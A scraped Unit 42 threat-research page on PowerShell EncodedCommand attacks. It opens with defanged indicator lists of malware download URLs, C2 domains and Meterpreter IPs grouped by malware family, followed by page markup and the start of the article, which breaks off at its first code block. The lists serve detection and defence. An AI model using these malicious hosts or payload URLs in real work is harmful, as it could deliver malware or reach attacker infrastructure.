]200.2.13:8080\/index.asp\n1\thxxp:\/\/78[.]229.133.134:80\/index.asp\n1\thxxp:\/\/68[.]66.9.76\/index.asp\n1\thxxp:\/\/52[.]36.245.145:8080\/index.asp\n1\thxxp:\/\/52[.]28.250.99:8080\/index.asp\n1\thxxp:\/\/52[.]196.119.113:80\/index.asp\n1\thxxp:\/\/50[.]251.57.67:8080\/index.asp\n1\thxxp:\/\/47[.]88.17.109:80\/index.asp\n1\thxxp:\/\/46[.]246.87.205\/index.asp\n1\thxxp:\/\/41[.]230.232.65:5552:5552\/index.asp\n1\thxxp:\/\/24[.]111.1.135:22\/index.asp\n1\thxxp:\/\/23[.]116.90.9:80\/index.asp\n1\thxxp:\/\/222[.]230.139.166:80\/index.asp\n1\thxxp:\/\/197[.]85.191.186:80\/index.asp\n1\thxxp:\/\/197[.]85.191.186:443\/index.asp\n1\thxxp:\/\/192[.]241.129.69:443\/index.asp\n1\thxxp:\/\/191[.]101.31.118:8081\/index.asp\n1\thxxp:\/\/187[.]228.46.144:8888\/index.asp\n1\thxxp:\/\/187[.]177.151.80:12345\/index.asp\n1\thxxp:\/\/166[.]78.124.106:80\/index.asp\n1\thxxp:\/\/163[.]172.151.90:80\/index.asp\n1\thxxp:\/\/149[.]56.178.124:8080\/index.asp\n1\thxxp:\/\/139[.]59.12.202:80\/index.asp\n1\thxxp:\/\/138[.]121.170.12:500\/index.asp\n1\thxxp:\/\/138[.]121.170.12:3138\/index.asp\n1\thxxp:\/\/138[.]121.170.12:3137\/index.asp\n1\thxxp:\/\/138[.]121.170.12:3136\/index.asp\n1\thxxp:\/\/138[.]121.170.12:3135\/index.asp\n1\thxxp:\/\/138[.]121.170.12:3133\/index.asp\n1\thxxp:\/\/138[.]121.170.12:3031\/index.asp\n1\thxxp:\/\/137[.]117.188.120:443\/index.asp\n1\thxxp:\/\/11[.]79.40.53:80\/index.asp\n1\thxxp:\/\/108[.]61.217.22:443\/index.asp\n1\thxxp:\/\/104[.]233.102.23:8080\/index.asp\n1\thxxp:\/\/104[.]145.225.3:8081\/index.asp\n1\thxxp:\/\/104[.]131.154.119:8080\/index.asp\n1\thxxp:\/\/104[.]130.51.215:80\/index.asp\n1\thxxp:\/\/100[.]100.100.100:8080\/index.asp\n\nDownloader DFSP 2X\n25\thxxp:\/\/93[.]174.94.135\/~kali\/ketty.exe\n19\thxxp:\/\/94[.]102.52.13\/~yahoo\/stchost.exe\n17\thxxp:\/\/93[.]174.94.137\/~rama\/jusched.exe\n17\thxxp:\/\/94[.]102.52.13\/~harvy\/scvhost.exe\n2\thxxp:\/\/10[.]10.01.10\/bahoo\/stchost.exe\n1\thxxp:\/\/93[.]174.94.135\/~harvy\/verfgt.exe\n\nDownloader DFSP DPL\n2\thxxp:\/\/198[.]50.137.173\/a.exe\n2\thxxp:\/\/201[.]130.72.171\/andac.exe\n2\thxxp:\/\/worldnit[.]com\/miracle.exe\n2\thxxp:\/\/www[.]amspeconline.com\/123\/nana.exe\n1\thxxp:\/\/198[.]50.137.173\/b.exe\n1\thxxp:\/\/31[.]184.234.74\/crypted\/1080qw.exe\n1\thxxp:\/\/alonqood[.]com\/abacom.exe\n1\thxxp:\/\/alonqood[.]com\/ezeke.exe\n1\thxxp:\/\/alonqood[.]com\/lumia.exe\n1\thxxp:\/\/alonqood[.]com\/nano.exe\n1\thxxp:\/\/alonqood[.]com\/obi.exe\n1\thxxp:\/\/snthostings[.]com\/billing\/\/includes\/db\/dannyfinal.exe\n1\thxxp:\/\/worldnit[.]com\/abu.exe\n1\thxxp:\/\/worldnit[.]com\/guyo.exe\n1\thxxp:\/\/worldnit[.]com\/vc.exe\n1\thxxp:\/\/www[.]amspeconline.com\/123\/nach.exe\n1\thxxp:\/\/www[.]amspeconline.com\/123\/nazy.exe\n1\thxxp:\/\/www[.]macwizinfo.com\/zap\/manage\/may2.exe\n1\thxxps:\/\/a[.]pomf.cat\/bvudaf.exe\n1\thxxps:\/\/a[.]pomf.cat\/qebhhu.exe\n\nDownloader IEXDS\n6\thxxp:\/\/84[.]200.84.187\/Google Update Check.html\n2\thxxp:\/\/52[.]183.79.94:80\/TYBMkTfsQ\n2\thxxp:\/\/76[.]74.127.38\/default-nco.html\n2\thxxp:\/\/pmlabs[.]net\/cis\/test.jpg\n2\thxxps:\/\/wowyy[.]ga\/counter.php?c=pdfxpl+\n1\thxxp:\/\/192[.]168.137.241:8080\/\n1\thxxp:\/\/91[.]120.23.152\/wizz.txt\n1\thxxp:\/\/93[.]171.205.35:8080\/\n1\thxxp:\/\/cannot[.]loginto.me\/googlehelper.ps1\n1\thxxps:\/\/invesco[.]online\/aaa\n\nBITSTransfer\n11\thxxp:\/\/94[.]102.50.39\/keyt.exe\n\nTXT C2\n4\tl[.]ns.topbrains.pl\n2\tp[.]s.os.ns.rankingplac.pl\n1\tl[.]ns.huawel.ro\n1\tp[.]s.pn.ns.sse.net.pl\n1\tp[.]s.rk.ns.rankingplac.pl\n1\tp[.]s.w2.ns.rankingplac.pl\n\nDownloader Proxy\n7\thxxp:\/\/54[.]213.195.138\/s2.txt?u=\n1\thxxp:\/\/www[.]bcbs-arizona.org\/s2.txt?u=\n1\thxxp:\/\/www[.]bcbsarizona.org\/s2.txt?u=\n\nDownloader Kraken\n5\thxxp:\/\/kulup[.]isikun.edu.tr\/Kraken.jpg\n\nPowerWorm\n12\thxxp:\/\/powerwormjqj42hu[.]onion\/get.php?s=setup&amp;mom=\n7\thxxp:\/\/powerwormjqj42hu[.]onion\/get.php?s=setup&amp;uid=\n\nAMSI Bypass\n4\thxxp:\/\/35[.]165.38.15:80\/login\/process.php\n1\thxxp:\/\/amazonsdeliveries[.]com:80\/account\/login.php\n1\thxxp:\/\/35[.]164.97.4:80\/admin\/get.php\n1\thxxp:\/\/162[.]253.133.189:443\/login\/process.php\n1\thxxp:\/\/162[.]253.133.189:443\/admin\/get.php\t\n\nMeterpreter RHTTP\n1\t198[.]56.248.117\n1\t62[.]109.8.21\n1\t65[.]112.221.34\n1\t88[.]160.254.183\n\nLayers of Obfuscation\n1\thxxp:\/\/ec2-35-167-185-55[.]us-west-2.compute.amazonaws.com:8080\/anSfrf\n\nSHA1 Hashtag\n1\thxxp:\/\/212[.]83.186.207\/?i=\n\nAdditional hashes to samples can be found here.","publisher":{"@type":"Organization","@id":"#panworg"},"image":{"@type":"ImageObject","url":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/uploads\/2016\/09\/unit42-web-banner-650x300-150x150.jpg","width":150,"height":150},"author":[{"@type":"Person","name":"Jeff White"}]}</script><link rel='stylesheet' id='crayon-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/crayon-syntax-highlighter/css/min/crayon.min.css?ver=_2.7.2_beta' type='text/css' media='all' />
<link rel='stylesheet' id='crayon-theme-classic-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/crayon-syntax-highlighter/themes/classic/classic.css?ver=_2.7.2_beta' type='text/css' media='all' />
<link rel='stylesheet' id='crayon-font-monaco-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/crayon-syntax-highlighter/fonts/monaco.css?ver=_2.7.2_beta' type='text/css' media='all' />
<link rel='stylesheet' id='wp-block-library-css'  href='https://unit42.paloaltonetworks.com/wp-includes/css/dist/block-library/style.min.css?ver=5.4.1' type='text/css' media='all' />
<link rel='stylesheet' id='dashicons-css'  href='https://unit42.paloaltonetworks.com/wp-includes/css/dashicons.min.css?ver=5.4.1' type='text/css' media='all' />
<link rel='stylesheet' id='post-views-counter-frontend-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/post-views-counter/css/frontend.css?ver=1.3.2' type='text/css' media='all' />
<link rel='stylesheet' id='wpml-legacy-horizontal-list-0-css'  href='//unit42.paloaltonetworks.com/wp-content/plugins/sitepress-multilingual-cms/templates/language-switchers/legacy-list-horizontal/style.css?ver=1' type='text/css' media='all' />
<link rel='stylesheet' id='wpml-legacy-post-translations-0-css'  href='//unit42.paloaltonetworks.com/wp-content/plugins/sitepress-multilingual-cms/templates/language-switchers/legacy-post-translations/style.css?ver=1' type='text/css' media='all' />
<link rel='stylesheet' id='wordpress-popular-posts-css-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/wordpress-popular-posts/assets/css/wpp.css?ver=5.2.4' type='text/css' media='all' />
<link rel='stylesheet' id='unit42/css-css'  href='https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/dist/styles/main.css' type='text/css' media='all' />
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-includes/js/jquery/jquery.js?ver=1.12.4-wp'></script>
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-includes/js/jquery/jquery-migrate.min.js?ver=1.4.1'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var CrayonSyntaxSettings = {"version":"_2.7.2_beta","is_admin":"0","ajaxurl":"https:\/\/unit42.paloaltonetworks.com\/wp-admin\/admin-ajax.php","prefix":"crayon-","setting":"crayon-setting","selected":"crayon-setting-selected","changed":"crayon-setting-changed","special":"crayon-setting-special","orig_value":"data-orig-value","debug":""};
var CrayonSyntaxStrings = {"copy":"Press %s to Copy, %s to Paste","minimize":"Click To Expand Code"};
/* ]]> */
</script>
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-content/plugins/crayon-syntax-highlighter/js/min/crayon.min.js?ver=_2.7.2_beta'></script>
<script type='application/json' id="wpp-json">
{"sampling_active":0,"sampling_rate":100,"ajax_url":"https:\/\/unit42.paloaltonetworks.com\/wp-json\/wordpress-popular-posts\/v1\/popular-posts","ID":25125,"token":"ca80e59221","lang":0,"debug":0}
</script>
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-content/plugins/wordpress-popular-posts/assets/js/wpp.min.js?ver=5.2.4'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var wpml_xdomain_data = {"css_selector":"wpml-ls-item","ajax_url":"https:\/\/unit42.paloaltonetworks.com\/wp-admin\/admin-ajax.php","current_lang":"en"};
/* ]]> */
</script>
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-content/plugins/sitepress-multilingual-cms/res/js/xdomain-data.js?ver=4.4.3'></script>
<link rel='https://api.w.org/' href='https://unit42.paloaltonetworks.com/wp-json/' />
<link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://unit42.paloaltonetworks.com/xmlrpc.php?rsd" />
<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="https://unit42.paloaltonetworks.com/wp-includes/wlwmanifest.xml" /> 
<meta name="generator" content="WordPress 5.4.1" />
<link rel='shortlink' href='https://unit42.paloaltonetworks.com/?p=25125' />
<link rel="alternate" type="application/json+oembed" href="https://unit42.paloaltonetworks.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Funit42.paloaltonetworks.com%2Funit42-pulling-back-the-curtains-on-encodedcommand-powershell-attacks%2F" />
<link rel="alternate" type="text/xml+oembed" href="https://unit42.paloaltonetworks.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Funit42.paloaltonetworks.com%2Funit42-pulling-back-the-curtains-on-encodedcommand-powershell-attacks%2F&#038;format=xml" />
<meta name="generator" content="WPML ver:4.4.3 stt:1,28;" />
<meta name="google-site-verification" content="zHZtYOWm9hm4SZgsH7wqiYcOwmsAsxDUDU4UD1QxB40" /><style>#wpdevart_lb_overlay{background-color:#000000;} #wpdevart_lb_overlay.wpdevart_opacity{opacity:0.8 !important;} #wpdevart_lb_main_desc{
				 -webkit-transition: opacity 0.3s ease;
				 -moz-transition: opacity 0.3s ease;
				 -o-transition: opacity 0.3s ease;
				 transition: opacity 0.3s ease;} #wpdevart_lb_information_content{
				 -webkit-transition: opacity 0.3s ease;
				 -moz-transition: opacity 0.3s ease;
				 -o-transition: opacity 0.3s ease;
				 transition: opacity 0.3s ease;}
		#wpdevart_lb_information_content{
			width:100%;	
		}
		#wpdevart_info_counter_of_imgs{
			    display: inline-block;
				padding-left:15px;
				padding-right:4px;
				font-size:20px;
				color:#000000;
		}
		#wpdevart_info_caption{
			    display: inline-block;
				padding-left:15px;
				padding-right:4px;
				font-size:20px;
				color:#000000;
		}
		#wpdevart_info_title{
			    display: inline-block;
				padding-left:5px;
				padding-right:5px;
				font-size:15px;
				color:#000000;
		}
		@-webkit-keyframes rotate {
			to   {-webkit-transform: rotate(360deg);}
			from  {-webkit-transform: rotate(0deg);}
		}
		@keyframes rotate {
			to   {transform: rotate(360deg);}
			from  {transform: rotate(0deg);}
		}
		#wpdevart_lb_loading_img,#wpdevart_lb_loading_img_first{
			-webkit-animation: rotate 2s linear  infinite;
    		animation: rotate 2s linear infinite;
		}
	  </style>        <script>var $ = jQuery;</script>
  
  
<script type="text/javascript">
;(function(win, doc, style, timeout) {
var STYLE_ID = 'at-body-style';
function getParent() {
return doc.getElementsByTagName('head')[0];
}
function addStyle(parent, id, def) {
if (!parent) {
return;
}
var style = doc.createElement('style');
style.id = id;
style.innerHTML = def;
parent.appendChild(style);
}
function removeStyle(parent, id) {
if (!parent) {
return;
}
var style = doc.getElementById(id);
if (!style) {
return;
}
parent.removeChild(style);
}
addStyle(getParent(), STYLE_ID, style);
setTimeout(function() {
removeStyle(getParent(), STYLE_ID);
}, timeout);
}(window, document, "body {visibility:hidden !important}", 3000));
</script>

<script src="//assets.adobedtm.com/9273d4aedcd2/0d76ae0322d7/launch-425c423d843b.min.js" async></script>
<script type="text/javascript" src="https://www.paloaltonetworks.com/content/dam/pan/en_US/includes/attribution.js"></script>
  </head>

  <body class="post-template-default single single-post postid-25125 single-format-standard">
    <!--[if IE]>
      <div class="alert alert-warning">
        You are using an <strong>outdated</strong> browser. Please <a href="http://browsehappy.com/">upgrade your browser</a> to improve your experience.      </div>
    <![endif]-->
    <header class="haeder py-15 position-relative z-index-2">
  <div class="container px-sm-30 px-35">
    <div class="row">
      <div class="first-logo col-sm-auto col-6 mb-sm-0 mb-40 text-sm-center order-1">
                  <a href="https://www.paloaltonetworks.com/">
<!--<img src="/wp-content/uploads/2019/07/paloaltonetwork.svg" class="attachment-full size-full" alt="" height="43" width="124" />-->
<svg width="140" height="26" viewBox="0 0 140 26" fill="none" xmlns="http://www.w3.org/2000/svg">
<path d="M59.4802 4.69592C57.6721 4.69592 55.7937 5.18876 53.469 6.43377L54.7605 9.62741C56.7794 8.50019 58.447 8.00735 59.6682 8.00735C61.0538 8.00735 61.6644 8.52395 61.6644 9.20483V9.25133C61.6644 9.72143 61.2883 9.97974 60.3729 10.0738L58.7766 10.238C54.7843 10.6606 53.1404 12.3985 53.1404 14.7934V14.9577C53.1404 17.2359 55.0188 19.0203 57.6721 19.0203C59.4192 19.0203 60.937 18.2826 61.8597 16.9807L62.1572 18.7857H65.7734V10.5904C65.7734 6.71584 63.5428 4.69592 59.4802 4.69592ZM59.1279 15.8969C57.7899 15.8969 57.1555 15.3803 57.1555 14.5816V14.5351C57.1555 13.8305 57.5543 13.3139 59.0101 13.1031L59.6445 13.0091C60.5713 12.8799 61.1406 12.7095 61.6644 12.3923V13.4317C61.6644 15.0052 60.6777 15.8969 59.1279 15.8969Z" fill="white"/>
<path d="M25.4785 4.78994L20.8528 0.164276L16.2271 4.78994L18.5281 7.09192L6.92828 18.6917L11.5539 23.3174L16.1796 18.6917L13.8787 16.3908L25.4785 4.78994Z" fill="white"/>
<path d="M11.6001 0.164048L0 11.7642L4.62603 16.3902L16.2262 4.79008L11.6001 0.164048Z" fill="white"/>
<path d="M27.7794 7.09215L16.1793 18.6923L20.8053 23.3183L32.4054 11.7182L27.7794 7.09215Z" fill="white"/>
<path d="M72.231 0H68.1219V18.7857H72.231V0Z" fill="white"/>
<path d="M46.2366 4.69592C44.3685 4.69592 42.8683 5.52249 42.0428 6.81709L41.7287 4.93046H38.1125V23.4806H42.2215V17.051C43.0037 18.2567 44.4832 19.0193 46.2366 19.0193C49.5242 19.0193 52.2013 16.1077 52.2013 12.0916V11.6215C52.2013 7.60853 49.5242 4.69592 46.2366 4.69592ZM47.9744 11.9759C47.9744 14.0888 46.871 15.6159 45.0391 15.6159C43.2072 15.6159 42.1038 14.0898 42.1038 11.9759V11.7414C42.1038 9.62741 43.2072 8.10137 45.0391 8.10137C46.871 8.10137 47.9744 9.62741 47.9744 11.7414V11.9759Z" fill="white"/>
<path d="M127.672 4.69592C123.469 4.69592 120.51 7.6075 120.51 11.6236V12.0937C120.51 16.1087 123.469 19.0213 127.672 19.0213C131.875 19.0213 134.834 16.1097 134.834 12.0937V11.6236C134.834 7.60853 131.875 4.69592 127.672 4.69592ZM130.607 11.9759C130.607 14.0888 129.504 15.6159 127.672 15.6159C125.84 15.6159 124.736 14.0898 124.736 11.9759V11.7414C124.736 9.62741 125.84 8.10137 127.672 8.10137C129.504 8.10137 130.607 9.62741 130.607 11.7414V11.9759Z" fill="white"/>
<path d="M138.708 5.54211V5.47185C138.708 5.07304 138.404 4.79097 137.863 4.79097H136.924V6.9514H137.37V6.22299H137.866L138.239 6.9514H138.732L138.274 6.09694C138.552 6.01119 138.708 5.80248 138.708 5.54211ZM137.369 5.18979H137.862C138.144 5.18979 138.261 5.28381 138.261 5.49562V5.51938C138.261 5.70742 138.143 5.82418 137.862 5.82418H137.369V5.18979Z" fill="white"/>
<path d="M137.769 3.63998C136.502 3.63998 135.539 4.60293 135.539 5.87067C135.539 7.13842 136.502 8.10137 137.769 8.10137C139.037 8.10137 140 7.13842 140 5.87067C140 4.60293 139.037 3.63998 137.769 3.63998ZM137.769 7.79554C136.666 7.79554 135.867 6.99687 135.867 5.86964C135.867 4.74241 136.666 3.94375 137.769 3.94375C138.873 3.94375 139.671 4.74241 139.671 5.86964C139.671 6.99687 138.873 7.79554 137.769 7.79554Z" fill="white"/>
<path d="M108.416 0H104.307V18.7857H108.416V0Z" fill="white"/>
<path d="M116.518 15.6159C115.321 15.6159 114.874 15.029 114.874 13.7613V8.10137H119.712V4.93149H114.874V1.76058L110.765 2.37121V14.159C110.765 17.3765 112.409 19.0203 115.697 19.0203C117.153 19.0203 118.867 18.5739 120.276 17.7753L119.102 14.8637C118.279 15.31 117.129 15.6159 116.518 15.6159Z" fill="white"/>
<path d="M95.6662 4.69592C93.8581 4.69592 91.9797 5.18876 89.655 6.43377L90.9465 9.62741C92.9654 8.50019 94.633 8.00735 95.8542 8.00735C97.2397 8.00735 97.8504 8.52395 97.8504 9.20483V9.25133C97.8504 9.72143 97.4743 9.97974 96.5589 10.0738L94.9626 10.238C90.9702 10.6606 89.3264 12.3985 89.3264 14.7934V14.9577C89.3264 17.2359 91.2048 19.0203 93.8581 19.0203C95.6042 19.0203 97.123 18.2826 98.0456 16.9807L98.3432 18.7857H101.959V10.5904C101.959 6.71584 99.7287 4.69592 95.6662 4.69592ZM95.3138 15.8969C93.9748 15.8969 93.3415 15.3803 93.3415 14.5816V14.5351C93.3415 13.8305 93.7403 13.3139 95.1961 13.1031L95.8304 13.0091C96.7572 12.8799 97.3265 12.7095 97.8493 12.3923V13.4317C97.8493 15.0052 96.8637 15.8969 95.3138 15.8969Z" fill="white"/>
<path d="M81.225 4.69592C77.022 4.69592 74.0629 7.6075 74.0629 11.6236V12.0937C74.0629 16.1087 77.022 19.0213 81.225 19.0213C85.4281 19.0213 88.3872 16.1097 88.3872 12.0937V11.6236C88.3862 7.60853 85.4281 4.69592 81.225 4.69592ZM84.1593 11.9759C84.1593 14.0888 83.0559 15.6159 81.224 15.6159C79.3921 15.6159 78.2887 14.0898 78.2887 11.9759V11.7414C78.2887 9.62741 79.3921 8.10137 81.224 8.10137C83.0559 8.10137 84.1593 9.62741 84.1593 11.7414V11.9759Z" fill="white"/>
<path d="M98.0446 22.1168H99.0975L100.551 24.0334H100.566V22.1168H101.532V25.4964H100.513L99.0251 23.5313H99.0107V25.4964H98.0446V22.1168Z" fill="white"/>
<path d="M102.816 22.1168H105.771L105.81 22.9372H103.825V23.4011H105.385V24.1491H103.825V24.676H105.868L105.829 25.4964H102.816V22.1168Z" fill="white"/>
<path d="M107.925 22.9857H106.742L106.78 22.1168H110.088L110.127 22.9857H108.944V25.4964H107.925V22.9857Z" fill="white"/>
<path d="M110.943 22.1168H112.024L112.575 24.4632H112.628L113.342 22.1168H114.333L115.033 24.4632H115.086L115.627 22.1168H116.66L115.771 25.4964H114.444L113.826 23.4589H113.797L113.169 25.4964H111.836L110.943 22.1168Z" fill="white"/>
<path d="M117.404 23.8071C117.404 22.7057 118.152 22.0155 119.335 22.0155C120.518 22.0155 121.267 22.7057 121.267 23.8071C121.267 24.9085 120.519 25.5987 119.335 25.5987C118.152 25.5987 117.404 24.9075 117.404 23.8071ZM120.257 23.8071C120.257 23.2234 119.92 22.8752 119.335 22.8752C118.75 22.8752 118.412 23.2234 118.412 23.8071C118.412 24.3919 118.75 24.7391 119.33 24.7391C119.914 24.7391 120.257 24.3909 120.257 23.8071Z" fill="white"/>
<path d="M122.363 22.1168H124.334C125.231 22.1168 125.672 22.5414 125.672 23.3287C125.672 23.8691 125.449 24.2369 125.014 24.4105L125.816 25.4974H124.667L124.044 24.6089H123.378V25.4974H122.363V22.1168ZM124.202 23.8164C124.54 23.8164 124.661 23.6284 124.661 23.3721C124.661 23.1159 124.54 22.933 124.202 22.933H123.377V23.8164H124.202Z" fill="white"/>
<path d="M126.989 22.1168H128.002V23.3628H128.418L129.408 22.1168H130.547L130.552 22.1209L129.259 23.7389L130.625 25.4923L130.62 25.4964H129.437L128.414 24.1977H128.002V25.4964H126.989V22.1168Z" fill="white"/>
<path d="M131.402 25.2743V24.3475H131.407C131.972 24.6327 132.523 24.7721 133 24.7721C133.363 24.7721 133.546 24.6853 133.546 24.5159C133.546 24.3465 133.425 24.3031 132.7 24.1873C131.909 24.0623 131.382 23.8247 131.382 23.1438C131.382 22.5115 131.938 22.0238 133.024 22.0238C133.459 22.0238 133.912 22.1158 134.333 22.2945V23.212L134.328 23.2172C133.927 22.9857 133.386 22.84 132.951 22.84C132.565 22.84 132.411 22.932 132.411 23.0859C132.411 23.2843 132.648 23.3029 133.242 23.4052C134.033 23.5406 134.56 23.7627 134.56 24.4777C134.56 25.0325 134.145 25.5884 132.952 25.5884C132.364 25.5884 131.894 25.4675 131.402 25.2743Z" fill="white"/>
</svg>

</a>

      </div>

      <div class="col-sm-auto col-6 text-sm-center order-sm-2 order-4 second-logo-unit">
        <a href="https://unit42.paloaltonetworks.com/">
            <!--<img src="/wp-content/uploads/2019/07/unit42.svg" class="attachment-full size-full" alt="" height="35" width="105" />-->
            <img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/dist/images/svg/unit42-logo-white.svg" class="attachment-full size-full" alt="Unit42 Logo"  width="150" height="35"/>
        </a>
      </div>

      <div class="col-auto d-sm-none ml-auto mb-40 order-2">
        <button class="btn__search" data-toggle="collapse" data-target="#search"><i class="ui ui-1"></i></button>
      </div>

      <div id="search" class="collapse d-sm-block col-sm-auto col-12 ml-auto order-3">
        <div class="pt-sm-0 pt-20 pb-sm-0 pb-40 mt-sm-0 mt-n30">
                      <input type="search" placeholder="Search Unit 42" id="innerSearch" class="header__search" value="" required>
                  </div>
      </div>

      <div class="col-auto d-sm-none d-flex ml-auto align-items-center order-5">
        <button class="btn__menu rounded" data-toggle="collapse" data-target="#navigation">Menu</button>
      </div>
    </div>
  </div>
</header>

<nav id="navigation" class="site-nav collapse d-sm-block pb-20 mt-sm-10">
  <div class="container px-sm-30">
    <ul id="menu-primary-navigation" class="main-menu d-sm-flex font-weight-medium"><li id="menu-item-97290" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-97290"><a href="https://unit42.paloaltonetworks.com/tools/">Tools</a></li>
<li id="menu-item-41" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-41"><a href="https://unit42.paloaltonetworks.com/atoms/">ATOMs</a></li>
<li id="menu-item-81229" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-81229"><a href="https://unit42.paloaltonetworks.com/about-unit-42/">About Us</a></li>
</ul>  </div>
</nav>


  <article class="article overflow-hidden">
    
<header class="article__header py-sm-25 pt-40 pb-25 bg-gray-700">
  <div class="container">
    
    <h1 class="article__header__title mb-sm-30 mb-40">Pulling Back the Curtains on EncodedCommand PowerShell Attacks</h1>

    <ul class="article__entry-meta d-flex flex-wrap align-items-center text-black">
      <li class="mr-10 mb-10 px-20 rounded-pill d-flex bg-gray-200"><div class="post-views post-25125 entry-meta">
				
				
				<span class="post-views-count">152,030</span>
			</div> <span class="ml-5">people reacted</span></li>
      <li class="d-sm-none col-12 p-0"></li>
      <li class="mr-10 mb-10 px-20 rounded-pill bg-gray-200"><span class="ldc-ul_cont idc_ul_cont_not_liked_inner" onclick="alter_ul_post_values(this,'25125','like')"><i class="ui ui-2"></i><span class="ml-5">9</span></span></li>
      <li class="mb-10 px-20 rounded-pill bg-gray-200"><span class="span-reading-time rt-reading-time"><span class="rt-label rt-prefix"></span> <span class="rt-time"> 29</span> <span class="rt-label rt-postfix"></span></span> min. read</li>
    </ul>

    <div class="article__share position-relative">
      <div class="dropdown dropdown-right">
        <button type="button" class="px-25 text-black bg-white text-uppercase rounded-pill" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">Share <i class="ui ui-6 ml-10 align-text-top"></i>
        </button>
        <div class="dropdown-menu rounded-pill" role="toolbar">
          <div class="share-dropdown px-20 py-10 text-black font-size-sm">
            <div class="row align-items-center flex-nowrap">
              <div class="col">
                <div class="d-flex align-items-center">
                  <a href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Funit42.paloaltonetworks.com%2Funit42-pulling-back-the-curtains-on-encodedcommand-powershell-attacks%2F" target="_blank"><i class="ui ui-7"></i></a>
                  <a href="https://twitter.com/share?text=Pulling+Back+the+Curtains+on+EncodedCommand+PowerShell+Attacks&url=https%3A%2F%2Funit42.paloaltonetworks.com%2Funit42-pulling-back-the-curtains-on-encodedcommand-powershell-attacks%2F" target="_blank"><i class="ui ui-8"></i></a>
                  <a href="https://www.linkedin.com/shareArticle?mini=true&url=https%3A%2F%2Funit42.paloaltonetworks.com%2Funit42-pulling-back-the-curtains-on-encodedcommand-powershell-attacks%2F&title=Pulling+Back+the+Curtains+on+EncodedCommand+PowerShell+Attacks&summary=&source=" target="_blank"><i class="ui ui-9"></i></a>
                  <a href="//www.reddit.com/submit?url=https://unit42.paloaltonetworks.com/unit42-pulling-back-the-curtains-on-encodedcommand-powershell-attacks/" target="_blank"><i class="ui ui-10"></i></a>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  </div>
</header>
    <div class="article__summary py-25 text-gray-500 font-size-sm">
  <div class="container">
    <div class="row align-items-center no-gutters">
      <div class="col-sm-auto col-12 mb-sm-0 mb-35">
        <i class="ui ui-11 text-gray-700 mr-sm-20"></i>
      </div>
  
      <div class="col-sm col-12">
        <p>
          By <a href="https://unit42.paloaltonetworks.com/author/jeff-white/" title="Posts by Jeff White" class="author url fn" rel="author">Jeff White</a>        </p>
        <p><time datetime="2017-03-10T13:00:41+00:00">March 10, 2017 at 5:00 AM</time></p>
        <p>Category: <a href="https://unit42.paloaltonetworks.com/category/unit42/" rel="category tag">Unit 42</a></p>
        <p>Tags: <a href="https://unit42.paloaltonetworks.com/tag/microsoft/" rel="tag">microsoft</a>, <a href="https://unit42.paloaltonetworks.com/tag/powershell/" rel="tag">Powershell</a></p>
      </div>
    </div>
  </div>
</div>    <div class="py-30 bg-white">
      <div class="container">
        <div class="article__content pb-30">
                      <figure class="mb-30 text-center">
              <img width="650" height="300" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2016/09/unit42-web-banner-650x300.jpg" class="attachment-single size-single wp-post-image" alt="" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2016/09/unit42-web-banner-650x300.jpg 650w, https://unit42.paloaltonetworks.com/wp-content/uploads/2016/09/unit42-web-banner-650x300-300x138.jpg 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2016/09/unit42-web-banner-650x300-370x171.jpg 370w" sizes="(max-width: 650px) 100vw, 650px" />            </figure>
                    <p class="wpml-ls-statics-post_translations wpml-ls">This post is also available in: 
    <span class="wpml-ls-slot-post_translations wpml-ls-item wpml-ls-item-ja wpml-ls-first-item wpml-ls-last-item wpml-ls-item-legacy-post-translations"><a href="https://unit42.paloaltonetworks.jp/unit42-pulling-back-the-curtains-on-encodedcommand-powershell-attacks/" class="wpml-ls-link"><span class="wpml-ls-native" lang="ja">日本語</span><span class="wpml-ls-display"><span class="wpml-ls-bracket"> (</span>Japanese<span class="wpml-ls-bracket">)</span></span></a></span></p><p><em>A note to readers: The code samples included within this blog post may trigger alerts from your security software. Please note that this does not indicate an infection or an attack; rather, it is a notification that the code could be malicious if it were live.</em></p>
<p>PowerShell has continued to gain in popularity over the past few years as the framework continues to mature, so it’s no surprise we’re seeing it in more attacks. PowerShell offers attackers a wide range of capabilities natively on the system and with a quick look at the landscape of malicious PowerShell tools flooding out; you have a decent indicator of its growth.</p>
<p>Microsoft has done a fantastic job in later versions of PowerShell by giving multiple ways to log PowerShell activity (Transcription, ScriptBlock, etc) so there has been a shift to try and further obfuscate attacks at runtime.</p>
<p>Enter stage left - the PowerShell ‘-EncodedCommand’ parameter!</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60a9b96a2c937016190799" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" max-width: 500px; margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
